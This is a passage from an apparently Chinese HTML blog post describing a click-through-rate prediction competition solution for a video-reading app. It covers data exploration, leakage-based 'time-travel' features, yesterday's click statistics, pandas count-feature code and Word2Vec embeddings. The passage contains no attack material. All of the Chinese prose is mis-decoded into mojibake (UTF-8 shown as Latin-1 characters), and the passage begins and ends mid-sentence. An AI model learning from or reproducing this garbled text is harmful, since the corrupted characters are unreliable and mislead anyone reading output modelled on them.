·å‡ºæ¥çš„ä¸€å®šé‡ç”¨æˆ·åœ¨ä¸‰å¤©ä¹‹å†…çš„ç§»åŠ¨ç«¯è¡Œä¸ºæ•°æ®ï¼ˆDï¼‰ï¼Œè¯„åˆ†æ•°æ®æ˜¯è¿™äº›ç”¨æˆ·åœ¨ä¹‹åä¸€å¤©å¯¹å­é›†ï¼ˆPï¼‰çš„ç‚¹å‡»æ•°æ®ã€‚å‚èµ›è€…è¦ä½¿ç”¨è®­ç»ƒæ•°æ®å»ºç«‹æ¨èæ¨¡å‹ï¼Œå¹¶è¾“å‡ºç”¨æˆ·åœ¨æ¥ä¸‹æ¥ä¸€å¤©ç‚¹å‡»è¡Œä¸ºçš„é¢„æµ‹ç»“æœã€‚</p><h1 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h1><h2 id="æ•°æ®æ¢ç´¢"><a href="#æ•°æ®æ¢ç´¢" class="headerlink" title="æ•°æ®æ¢ç´¢"></a>æ•°æ®æ¢ç´¢</h2><p>é€šè¿‡æ•°æ®æ¥æºï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ›´æ¸…æ¥šåœ°äº†è§£æ•°æ®ï¼Œäº†è§£ä¸šåŠ¡èƒŒæ™¯ã€‚æ¯”èµ›æ•°æ®é‡‡é›†äºä¸€æ¬¾å«â€œäº¿åˆ»çœ‹ç‚¹â€çš„ APPï¼Œæ­¤ APP å®‰å“ç‹¬å ï¼Œå› ä¸ºå…¶æŸäº›æµæ°“æ“ä½œåœ¨è‹¹æœé‚£è¾¹åº”è¯¥è¿‡ä¸äº†å®¡ã€‚è¿™æ¬¾ APP ä»¥é˜…è¯»èµšé’±ï¼ˆçœ‹åº”ç”¨å¸‚åœºè¯„è®ºæç°å¾ˆå›°éš¾ï¼‰ä¸ºå¸å¼•ç‚¹å¸å¼•ç”¨æˆ·ä½¿ç”¨ï¼Œä½†æœ‰äº›è¿·ä¹‹æ“ä½œï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šå‡ºç°å¹¿å‘Šå’Œä¸‹è½½å¼¹çª—ï¼Œç”šè‡³é€€å‡ºè¿™æ¬¾ APP åä¹Ÿèƒ½ç»™æˆ‘å¼¹ï¼ˆå¦‚å›¾1å·¦ï¼‰ã€‚APP æ¨èçš„è§†é¢‘å¤§å¤šæ˜¯å½±è§†å‰ªè¾‘ï¼Œæ²¡æœ‰ä»»ä½•æ—¶æ•ˆæ€§ï¼Œæ¨èç­–ç•¥ä¹Ÿå¾ˆå•ä¸€ï¼šæ¨èä¸ä¸Šæ¬¡ç‚¹å‡»ç›¸ä¼¼çš„è§†é¢‘ã€‚ä»å›¾1å³å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ç‚¹å‡»äº†â€œé‚£å¹´èŠ±å¼€â€çš„è§†é¢‘ç‰‡æ®µåï¼Œåˆ·æ–°ä¹‹åå†æ¨èçš„å°±æ˜¯è¯¥å½±è§†å‰§ç›¸å…³ã€‚</p><center class="half">    <img src="http://pic.logicjake.xyz/app%E5%B1%95%E7%A4%BA.jpg" style="margin: auto;max-width: 30%; margin-right:10%;"/><img src="http://pic.logicjake.xyz/app%E5%B1%95%E7%A4%BA%E8%A7%86%E9%A2%91.gif" style="margin: auto;max-width: 30%;"/>    <div style="margin-top: 2%">å›¾1 APP ä½¿ç”¨å±•ç¤º</div></center><p>ä»ä¸€ä¸ªç”¨æˆ·çš„è§’åº¦ï¼Œè¿™æ¬¾ APP çš„ç”¨æˆ·ä½“éªŒä¸ä½³ï¼Œé¦–å…ˆå¹¿å‘Šå¼¹å‡ºï¼Œè¯¯è§¦ä¸‹è½½è®©æˆ‘æ— æ³•å¿å—ï¼Œæ‰€ä»¥ä¸å¯èƒ½æŒç»­ä½¿ç”¨ã€‚å³ä½¿æœ‰äº›äººä¸ºäº†èµšé’±ä½¿ç”¨ï¼Œä¹Ÿæœ‰æå¤§å‡ ç‡ä¸ºäº†å¥–åŠ±å»ç‚¹å‡»è§†é¢‘ï¼Œè¿™æ ·ä¼šäº§ç”Ÿå¤§é‡ä¸å¯ä¿¡çš„æ“ä½œæ•°æ®ã€‚å½“ä¸€ä¸ªäººçš„è¡Œä¸ºæ•°æ®ä¸å¯ä¿¡ï¼Œå¯¹å…¶æœªæ¥çš„ç‚¹å‡»é¢„ä¼°ä¹Ÿå°±æ— ä»è°ˆèµ·äº†ã€‚åœ¨æ¯”èµ›ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„ä½“ä¼šï¼Œè®¸å¤š ctr é¢„ä¼°ä¸­ä½¿ç”¨çš„å¸¸è§„ç‰¹å¾æ”¶ç›Šå¾ˆä½ç”šè‡³æ— æ•ˆã€‚</p><p>å›å½’åˆ°æ•°æ®æœ¬èº«ï¼Œè®­ç»ƒé›†æ€»å…±ç»™å‡ºäº†ä»2019.11.08 ~ 2019.11.10çš„ä¸‰å¤©æ•°æ®ï¼Œéœ€è¦é¢„æµ‹2019.11.11çš„ç”¨æˆ·ç‚¹å‡»è¡Œä¸ºã€‚é¦–å…ˆè§‚å¯Ÿä¸€ä¸‹æ–°è€ç”¨æˆ·åˆ†å¸ƒï¼Œä¸‹è¡¨åˆ—å‡ºäº†9ï¼Œ10ï¼Œ11ä¸‰å¤©æ˜¨æ—¥è€ç”¨æˆ·å æ¯”ã€‚å¯ä»¥çœ‹å‡ºæ˜¨æ—¥è€ç”¨æˆ·å æ¯”è¿˜æ˜¯æŒºé«˜ï¼Œæ‰€ä»¥åœ¨åé¢çš„ç‰¹å¾å·¥ç¨‹åšäº†å¤§é‡é’ˆå¯¹ç”¨æˆ·æ˜¨æ—¥è¡Œä¸ºçš„ç‰¹å¾ã€‚æŒ‰é“ç†è¯´è¿™ç§ä½“éªŒæ„Ÿä¸å¥½çš„ APPï¼Œåœ¨ç”¨æˆ·æ‰‹æœºä¸Šå­˜æ´»æ—¶é—´ä¸ä¼šå¤ªé•¿ï¼Œåº”è¯¥ä¸ä¼šå­˜åœ¨è¿™ä¹ˆé«˜çš„è€ç”¨æˆ·æ¯”ä¾‹ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯å¥–åŠ±èµ·åˆ°äº†ä½œç”¨è¿˜æ˜¯æ•°æ®æä¾›æ–¹ç‰¹æ„ç­›é€‰å‡ºä¸€éƒ¨åˆ†æ´»è·ƒç”¨æˆ·ã€‚</p><table><thead><tr><th align="center">day</th><th align="center">æ˜¨æ—¥è€ç”¨æˆ·æ¯”ä¾‹</th></tr></thead><tbody><tr><td align="center">9</td><td align="center">0.6501773380623483</td></tr><tr><td align="center">10</td><td align="center">0.6388528497721992</td></tr><tr><td align="center">11</td><td align="center">0.7410879161463921</td></tr></tbody></table><h2 id="ç‰¹å¾å·¥ç¨‹"><a href="#ç‰¹å¾å·¥ç¨‹" class="headerlink" title="ç‰¹å¾å·¥ç¨‹"></a>ç‰¹å¾å·¥ç¨‹</h2><p>è¿™ä¸€é¢˜æ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œæ¨¡å‹è®­ç»ƒèµ·æ¥ä¹Ÿæ¯”è¾ƒæ…¢ï¼Œæ‰€ä»¥é’ˆå¯¹ lgb æ¨¡å‹å‡†å¤‡äº†ä¸¤å¥—å‚æ•°ï¼Œä¸€å¥—å­¦ä¹ ç‡æ¯”è¾ƒå¤§ç”¨äºå¿«é€Ÿè¿­ä»£éªŒè¯ç‰¹å¾æ•ˆæœï¼Œè®­ç»ƒä¸€æ¬¡å¤§æ¦‚åœ¨åŠå°æ—¶å·¦å³ï¼Œçº¿ä¸Šåˆ†æ•°0.825ã€‚å¦å¤–ä¸€å¥—å­¦ä¹ ç‡ä¸º0.01çš„å‚æ•°ç”¨äºæ­£å¼æäº¤ï¼Œè¿è¡Œä¸€æ¬¡å¤§æ¦‚éœ€è¦15å°æ—¶ï¼Œçº¿ä¸Šåˆ†æ•°0.8377ã€‚</p><h3 id="ç©¿è¶Šç‰¹å¾"><a href="#ç©¿è¶Šç‰¹å¾" class="headerlink" title="ç©¿è¶Šç‰¹å¾"></a>ç©¿è¶Šç‰¹å¾</h3><p>å‰é¢è¯´è¿‡ï¼Œè¿™é¢˜å¸¸è§„ç‰¹å¾æ”¶ç›Šå¾ˆå°ï¼Œä½†ç”±äºæ•°æ®ç»™å‡ºäº†è§†é¢‘æ›å…‰æ—¶é—´ï¼ˆtsï¼‰ï¼Œæ‰€ä»¥å¯ä»¥å€ŸåŠ©å…¶æ„é€ å¤§é‡ç©¿è¶Šç‰¹å¾ï¼Œæˆ–è€…ç§°ä½œä¸ºè§†é¢‘ç‚¹å‡»åçš„æ¨¡å¼ç‰¹å¾ã€‚åŸºæœ¬æ„é€ æ–¹æ³•å°±æ˜¯è®¡ç®—è·ç¦»ä¸‹ä¸€æ¬¡è§†é¢‘æ›å…‰çš„æ—¶é—´å·®ã€‚è¿™ä¹ˆåšçš„åŸå› ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå‡å¦‚ä¸€ä¸ªäººç‚¹å‡»äº†æŸä¸ªè§†é¢‘ï¼Œé‚£ä¹ˆå¿…ç„¶ä¼šè§‚çœ‹ä¸€æ®µæ—¶é—´ï¼Œé‚£ä¹ˆè·ç¦»ä¸‹ä¸€æ¬¡è§†é¢‘çš„æ›å…‰å°±ä¼šä¹…ä¸€ç‚¹ï¼Œts å·®å€¼ä¹Ÿè¾ƒå¤§ã€‚ç›¸åï¼Œè¿ç»­ä¸¤æ¬¡è§†é¢‘çš„æ›å…‰æ—¶é—´é—´éš”åº”è¯¥å¾ˆå°ã€‚è·ç¦»ä¸Šæ¬¡è§†é¢‘çš„æ›å…‰æ—¶é—´å·®ä¹Ÿæ˜¯æœ‰æ•ˆçš„ï¼Œæ ¹æ® APP çš„æ¨èè§„åˆ™ï¼Œåœ¨ç‚¹å‡»è§†é¢‘åä¸‹æ¬¡æ¨èçš„ä¹Ÿæ˜¯ç›¸å…³è§†é¢‘ï¼Œä»è€Œå†æ¬¡ç‚¹å‡»çš„å¯èƒ½æ€§è¾ƒå¤§ã€‚æˆ‘ä»¬æ„é€ äº†å¤§é‡ç»„åˆä¸‹çš„è§†é¢‘æ›å…‰æ—¶é—´é—´éš”ï¼Œæ›å…‰è·¨åº¦ä¹Ÿä»1å¾€åæ‰©å±•ï¼Œä¸»è¦æ„é€ å¦‚ä¸‹ç‰¹å¾ï¼š</p><ul><li>deviceid å‰xæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li><li>deviceid netmodel å‰xæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li><li>deviceid åxæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li><li>deviceid pos åxæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li><li>deviceid netmodel åxæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li><li>deviceid netmodel pos åxæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li><li>deviceid lng_lat åxæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li><li>deviceid lng_lat pos åxæ¬¡æ›å…‰åˆ°å½“å‰çš„æ—¶é—´å·®</li></ul><p>é™¤ ts æ˜¯ä¸ªå¼ºç‰¹å¾ä¹‹å¤–ï¼Œpos ä¹Ÿæ˜¯å¼ºç‰¹ã€‚pos å–å€¼èŒƒå›´ä¸º0 ï½ 8ï¼Œå–å€¼åˆ†å¸ƒå¦‚å›¾2å·¦æ‰€ç¤ºã€‚æŠ“åŒ…åˆ†æå¯çŸ¥0 ï½ 3è¿™å››ä¸ªå€¼å¯¹åº”é¦–é¡µæ¨èå››ä¸ªä½ç½®ï¼Œä½†ä»å›¾2å³å¯ä»¥çœ‹åˆ°ç•Œé¢å¤§å°æœ€å¤šåªå¤Ÿæ˜¾ç¤º2ä¸ªåŠï¼Œæœ‰æ›å…‰æ‰æœ‰æµé‡ï¼Œæ‰€ä»¥æ‰ä¼šå¯¼è‡´ pos å–0ï¼Œ1ï¼Œ2çš„æ•°æ®é‡ç›¸è¾ƒäº3è¾ƒå¤§ã€‚posä¸­çš„å…¶ä»–å–å€¼å¹¶æ²¡æœ‰æ‰¾åˆ°åœ¨ä½•å¤„äº§ç”Ÿï¼ŒçŒœæƒ³å¯èƒ½æ¥è‡ªäºç›¸å…³æ¨èè§†é¢‘ç‚¹å‡»æˆ–è€…æ¶ˆæ¯æ æ¨é€ç‚¹å‡»ã€‚è¿›ä¸€æ­¥åˆ†æåœ¨ä¸åŒ pos ä¸‹çš„ç‚¹å‡»ç‡ï¼Œå¦‚å›¾3æ‰€ç¤ºã€‚å¯ä»¥çœ‹å‡ºåŒæ ·æ˜¯é¦–é¡µæ¨èä½ç½®ï¼Œä½ç½®3è™½ç„¶æ€»æ•°æ®ä¸å¤šï¼Œä½†ç‚¹å‡»ç‡è¿œé«˜äºå…¶ä»–é¦–é¡µä½ç½®ã€‚åˆæ­¥çŒœæƒ³å¤§éƒ¨åˆ†ç”¨æˆ·å¯èƒ½åªæ‰“å¼€çœ‹äº†ä¸€ä¸‹ï¼Œåªçœ‹åˆ°é¦–é¡µå±å¹•å¤§å°å±•ç¤ºçš„ä¸‰ä¸ªè§†é¢‘ï¼Œå¹¶ä¸ä¼šä¸‹æ»‘æŸ¥çœ‹æ›´å¤šæ¨èï¼Œæ‰€ä»¥æ‰ä¼šå‡ºç°0 ï½ 2çš„æ•°æ®é‡å¤§ï¼Œä½†ç‚¹å‡»ç‡éå¸¸ä½çš„æƒ…å†µã€‚å¯¹äºæ·±åº¦ä½¿ç”¨ç”¨æˆ·ï¼Œå…¶è¦ä¹ˆå‡ºäºå®Œæˆä»»åŠ¡æ‹¿å¥–åŠ±çš„ç›®çš„è¿˜æ˜¯æ­£å¸¸ä½¿ç”¨ï¼Œç‚¹å‡»æ¬²æœ›ç›¸å¯¹æ›´é«˜ï¼Œè¿™éƒ¨åˆ†ç”¨æˆ·åœ¨ä½¿ç”¨æ¢ç´¢ä¸­ä¼šæ›´å¤šåœ°çœ‹åˆ° pos 3ä»¥ä¸Šçš„è§†é¢‘ã€‚</p><center class="half">    <img src="http://pic.logicjake.xyz/pos%E5%88%86%E5%B8%83.png" style="margin: auto;max-width: 30%; margin-right:10%;"/><img src="http://pic.logicjake.xyz/%E8%A7%86%E9%A2%91%E4%BD%8D%E7%BD%AE.jpg" style="margin: auto;max-width: 30%;"/>    <div style="margin: 2%">å›¾2 å·¦ï¼špos å–å€¼åˆ†å¸ƒï¼›å³ï¼šapp è§†é¢‘å±•ç¤ºä½</div></center><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/pos%20%E7%82%B9%E5%87%BB%E7%8E%87.png" alt="å›¾3 å„posæ˜¯å¦ç‚¹å‡»åˆ†å¸ƒ" title="">                </div>                <div class="image-caption">å›¾3 å„posæ˜¯å¦ç‚¹å‡»åˆ†å¸ƒ</div>            </figure></div><p>æ•ˆä»¿ ts çš„ç©¿è¶Šç‰¹å¾æ„é€ ï¼Œæˆ‘ä»¬åˆå°è¯•æ„é€ äº†åxæ¬¡è§†é¢‘æ›å…‰ä½ç½®ï¼ŒåŒæ ·æ•ˆæœä¹Ÿååˆ†æ˜¾è‘—ã€‚ä»”ç»†ç ”ç©¶ APP å‘ç°ï¼Œå‡å¦‚ä½ ä¸æ˜¯ç›´æ¥åœ¨é¦–é¡µç‚¹å‡»æ’­æ”¾è§†é¢‘ï¼Œè€Œæ˜¯ç‚¹å‡»è¿›å…¥è¯¥è§†é¢‘çš„è¯¦æƒ…é¡µï¼ŒåŒæ ·ä¼šè§¦å‘è§†é¢‘è§‚çœ‹ï¼ŒåŒæ—¶åœ¨è§†é¢‘è¯¦æƒ…é¡µä¸‹ä¼šå‡ºç°ç›¸å…³æ¨èè§†é¢‘ï¼Œå¦‚å›¾4çº¢æ¡†æ‰€ç¤ºã€‚ç»¼ä¸ŠçŒœæµ‹ï¼Œpos ä¸­æŸäº›å–å€¼å¯¹åº”äºç›¸å…³æ¨èä½ï¼Œæ‰€ä»¥å½“ä¸‹æ¬¡è§†é¢‘æ›å…‰ä½ç½®ä¸ºä¸Šè¿°ç›¸å…³æ¨èä½ï¼Œåˆ™è¡¨ç¤ºå½“æ¬¡è§†é¢‘ä¸€å®šæ˜¯è¢«ç”¨æˆ·ç‚¹å‡»è§‚çœ‹çš„ã€‚</p><div style="margin: auto;max-width: 30%; "><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E7%9B%B8%E5%85%B3%E6%8E%A8%E8%8D%90.jpg" alt="å›¾4 ç›¸å…³æ¨è" title="">                </div>                <div class="image-caption">å›¾4 ç›¸å…³æ¨è</div>            </figure></div><p>é€šè¿‡å­¦ä¹ ä¸Šè¿°ä¸¤å¤§ç±»ç©¿è¶Šç‰¹å¾ï¼Œæ¨¡å‹çš„æ•ˆæœå·²ç„¶ååˆ†æ˜æ˜¾ï¼Œåœ¨å¿«é€Ÿè¿­ä»£æ¨¡å‹ä¸Šï¼Œå·²ç»èƒ½å¤Ÿè¾¾åˆ°0.80114çš„åˆ†æ•°ã€‚ç›¸è¾ƒäºæœ€é«˜åˆ†0.825ï¼Œè¯´æ˜å¸¸è§„ç‰¹å¾å¸¦æ¥çš„æ”¶ç›Šåªèƒ½æé«˜0.024ã€‚ç©¿è¶Šç‰¹å¾åªæœ‰30+ï¼Œä½†å¸¸è§„ç‰¹å¾å´æœ‰140å·¦å³ï¼Œæ”¶ç›Šå¯¹æ¯”ä¸€ç›®äº†ç„¶ã€‚å·¥ç¨‹å®è·µä¸­ç©¿è¶Šç‰¹å¾è‡ªç„¶æ— æ³•ä½¿ç”¨ï¼Œä½†ä½œä¸ºä¸€é¡¹æ•°æ®æŒ–æ˜æ¯”èµ›ï¼Œå½“ç„¶æ˜¯è¿½æ±‚å·²æœ‰æ•°æ®çš„æœ€å¤§åŒ–åˆ©ç”¨ã€‚</p><p>é™¤äº†ä¸Šè¿°ä¸¤å¤§ç±»ç©¿è¶Šç‰¹å¾ï¼Œè¿˜æ„é€ äº†ä¸‹ä¸€æ¬¡è§†é¢‘æ›å…‰çš„ç½‘ç»œç¯å¢ƒå’ŒåŸºäºç»çº¬åº¦çš„ä½ç½®å˜åŒ–ã€‚</p><h3 id="å†å²ç‰¹å¾"><a href="#å†å²ç‰¹å¾" class="headerlink" title="å†å²ç‰¹å¾"></a>å†å²ç‰¹å¾</h3><p>å†å²ç‰¹å¾ä¸»è¦ç”¨è¿‡å»ä¸€ä¸ªæ—¶é—´å•ä½çš„æ•°æ®è¿›è¡Œç»Ÿè®¡ï¼Œç„¶åä½œä¸ºå½“å‰æ—¶åˆ»çš„ç‰¹å¾ã€‚ç”±äºæ•°æ®ä¸­æ˜¨æ—¥è€ç”¨æˆ·å æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æœ¬æ–¹æ¡ˆå¤§é‡æ„é€ äº†æ˜¨æ—¥æ•°æ®ç»Ÿè®¡ç‰¹å¾ã€‚åœ¨è¿™éƒ¨åˆ†ç‰¹å¾ä¸­å¤§é‡æ¶‰åŠåˆ°å„ç§ç‚¹å‡»ç‡çš„æ„é€ ï¼Œç‚¹å‡»ç‡ä½¿ç”¨åˆ°äº†æ ‡ç­¾æ•°æ®ï¼Œå› æ­¤ç›¸è¾ƒäºå…¨å±€ç»Ÿè®¡ç‚¹å‡»ç‡ï¼Œæ„é€ æ˜¨æ—¥ç‚¹å‡»ç‡é¿å…äº†æ ‡ç­¾æ³„éœ²å’Œæ•°æ®ç©¿è¶Šé—®é¢˜ã€‚ä¸»è¦æ„é€ çš„ç‚¹å‡»ç»Ÿè®¡ç‰¹å¾å¦‚ä¸‹ï¼š</p><ul><li>deviceid ç‚¹å‡»æ¬¡æ•°ï¼Œç‚¹å‡»ç‡</li><li>deviceid, hour ç‚¹å‡»ç‡</li><li>deviceid, netmodel ç‚¹å‡»ç‡</li><li>newsid ç‚¹å‡»æ¬¡æ•°ï¼Œç‚¹å‡»ç‡</li><li>next_pos ç‚¹å‡»ç‡</li></ul><p>åŸæ•°æ®ç»™å‡ºäº†ä¸¤ä¸ªæ—¶é—´ç‰¹å¾ï¼Œä¸€ä¸ªæ˜¯è§†é¢‘æ›å…‰æ—¶é—´ ts å’Œè§†é¢‘å‡å¦‚è¢«ç‚¹å‡»æ—¶çš„ç‚¹å‡»æ—¶é—´ timestampã€‚äºŒè€…çš„å·®å€¼å¯ä»¥è¡¨ç¤ºç”¨æˆ·çš„ååº”æ—¶é—´ï¼Œååº”æ—¶é—´è¶ŠçŸ­è¯´æ˜ç”¨æˆ·è¶Šå–œæ¬¢è¯¥ç±»è§†é¢‘ã€‚é’ˆå¯¹ååº”æ—¶é—´åˆ†åˆ«ä»¥ deviceid å’Œ newsid ä¸ºå•ä½æ„é€ ç»Ÿè®¡ç‰¹å¾ï¼Œæ„é€ æ–¹å¼åŒ…æ‹¬ï¼šmaxï¼Œminï¼Œmeanï¼Œstdï¼Œmedianï¼Œkurt å’Œ quantileã€‚ååº”æ—¶é—´ä»ç”¨æˆ·ä¾§æå–ï¼Œæ‰€ä»¥é’ˆå¯¹ newsid åšç»Ÿè®¡è¯¯å·®è¾ƒå¤§ï¼Œæ•ˆæœä¸æ˜æ˜¾ï¼Œæ‰€ä»¥åªä¿ç•™äº† std ç»Ÿè®¡ã€‚</p><p>é™¤äº†ä»¥å¤©ä¸ºå•ä½æ„é€ æ˜¨æ—¥æ•°æ®ç‰¹å¾ï¼Œè¿˜ä»¥å°æ—¶ä¸ºå•ä½æ„é€ ä¸Šä¸€å°æ—¶çš„ç»Ÿè®¡ç‰¹å¾ï¼Œå°è¯•ä¸‹æ¥åªæœ‰ä¸Šä¸€å°æ—¶çš„ deviceid ç‚¹å‡»æ¬¡æ•°å’Œç‚¹å‡»ç‡æœ‰ç‚¹æ•ˆæœã€‚</p><h3 id="count-ç»Ÿè®¡"><a href="#count-ç»Ÿè®¡" class="headerlink" title="count ç»Ÿè®¡"></a>count ç»Ÿè®¡</h3><p>è¿™éƒ¨åˆ†ç‰¹å¾ä»¥ä¸åŒæ—¶é—´å•ä½è¿›è¡Œ count ç»Ÿè®¡ï¼Œæ—¶é—´å•ä½åŒ…æ‹¬ï¼š10åˆ†é’Ÿï¼Œå°æ—¶ï¼Œå¤©ï¼Œå…¨å±€ã€‚ä¸åŒäºå†å²ç‰¹å¾ï¼Œè¿™éƒ¨åˆ† count ç»Ÿè®¡å¾€å¾€ä¼šå‡ºç°æ•°æ®ç©¿è¶Šé—®é¢˜ã€‚count ç‰¹å¾ä¸»è¦ååº”åå¥½å±æ€§ï¼Œæ¯”å¦‚ä»Šå¤©å“ªä¸ªè§†é¢‘æ›å…‰é‡å¤§ï¼Œç”¨æˆ·å€¾å‘äºåœ¨å“ªä¸ªæ—¶é—´ï¼Œå“ªä¸ªç½‘ç»œç¯å¢ƒä¸‹ä½¿ç”¨ APPã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat_list = [[<span class="string">'deviceid'</span>], [<span class="string">'guid'</span>], [<span class="string">'newsid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'pos'</span>], [<span class="string">'newsid'</span>, <span class="string">'pos'</span>], </span><br><span class="line">            [<span class="string">'deviceid'</span>, <span class="string">'guid'</span>, <span class="string">'newsid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'next_pos'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_day_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'day'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>], [<span class="string">'guid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'pos'</span>], [<span class="string">'deviceid'</span>, <span class="string">'netmodel'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_minute10_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'day'</span>, <span class="string">'hour'</span>, <span class="string">'minute10'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>, <span class="string">'netmodel'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_hour_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'hourl'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>, <span class="string">'group'</span>, <span class="string">'pos'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby(f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br></pre></td></tr></table></figure><h3 id="embedding-ç‰¹å¾"><a href="#embedding-ç‰¹å¾" class="headerlink" title="embedding ç‰¹å¾"></a>embedding ç‰¹å¾</h3><p>ä½œä¸ºæ¨èä¸­é‡è¦çš„ä¸€æ–¹ï¼Œæ•°æ®é›†ç»™å‡ºçš„è§†é¢‘ä¿¡æ¯ååˆ†å°‘ï¼Œåªæœ‰ä¸€åˆ—ç®€å•çš„è§†é¢‘ idï¼Œå¹¶æ²¡æœ‰è§†é¢‘åˆ†ç±»ä¹‹ç±»çš„å¯¹æ¨èé‡è¦çš„å±æ€§ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä»è§†é¢‘è¢«æ¨èç»™å“ªäº›ç”¨æˆ·ä¸‹æ‰‹ã€‚ä»¥è§†é¢‘ä¸ºå•ä½ï¼Œæ‰¾å‡ºè¢«æ¨èçš„ç”¨æˆ·åˆ—è¡¨ï¼Œæ¯ä¸ªåˆ—è¡¨ä½œä¸ºå¥å­å–‚åˆ° Word2Vec æ¨¡å‹å¾—åˆ°æ¯ä¸ªç”¨æˆ·çš„ embedding å‘é‡ï¼Œç”¨è§†é¢‘æ‰€æœ‰è¢«æ¨èçš„ç”¨æˆ·çš„ embedding å‘é‡å¹³å‡å€¼è¡¨ç¤ºè§†é¢‘ã€‚å¾—åˆ° embedding ä¹‹åï¼Œå°±å¯ä»¥åº¦é‡ä¸¤ä¸ªè§†é¢‘ä¹‹é—´çš„ç›¸ä¼¼åº¦ï¼Œæ‰€ä»¥ä¹Ÿå°±äº§ç”Ÿäº†å¦å¤–ä¸€ç§æ€è·¯ï¼Œå½“ä¸€ä¸ªæ–°è§†é¢‘è¢«æ¨èç»™ç”¨æˆ·åï¼Œè®¡ç®—æ–°è§†é¢‘ä¸ä¹‹å‰ç”¨æˆ·è¢«æ¨èè¿‡ï¼ˆæˆ–è€…çœ‹è¿‡ï¼‰çš„è§†é¢‘çš„å¹³å‡ç›¸ä¼¼åº¦ï¼Œå¹³å‡ç›¸ä¼¼åº¦è¶Šå¤§ï¼Œç”¨æˆ·ç‚¹å‡»çš„å¯èƒ½æ€§è¶Šå¤§ã€‚ä½†åœ¨å®é™…è¯•éªŒä¸­æ•ˆæœä¸å¥½ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯ embedding æ•ˆæœè¾¾ä¸åˆ°çš„åŸå› ã€‚</p><h3 id="user-è¡¨çš„æ‰“å¼€æ–¹å¼"><a href="#user-è¡¨çš„æ‰“å¼€æ–¹å¼" class="headerlink" title="user è¡¨çš„æ‰“å¼€æ–¹å¼"></a>user è¡¨çš„æ‰“å¼€æ–¹å¼</h3><p>è¿™ä¸€é¢˜ç‰¹å¾æ„é€ ä¸»è¦è¿˜æ˜¯å›´ç»• train è¡¨åšçš„ï¼Œuser è¡¨æ‰“å¼€è¿‡å¤šæ¬¡éƒ½æ²¡å•¥æ•ˆæœã€‚ç”¨æˆ·ç”»åƒå±æ€§ tag å’Œ outertag ç»´åº¦ç‰¹åˆ«é«˜ï¼Œå°è¯•è¿‡ PCA é™ç»´å’Œå„ç§ embedding æ–¹å¼éƒ½ä¸è¡Œï¼Œæœ€åè¿˜æ˜¯é‡‡ç”¨çš„å¼€æºæ–¹æ³•ï¼Œå¯¹ tag çš„åˆ†æ•°åšä¸€äº›ç®€å•çš„ç»Ÿè®¡ã€‚app è¡¨çš„ applist ç»´åº¦æ›´é«˜ï¼Œä¹Ÿæ˜¯å„ç§å°è¯•æ— æ•ˆã€‚</p><h3 id="å…¶ä»–ç‰¹å¾"><a href="#å…¶ä»–ç‰¹å¾" class="headerlink" title="å…¶ä»–ç‰¹å¾"></a>å…¶ä»–ç‰¹å¾</h3><p>æˆ‘ä»¬æ 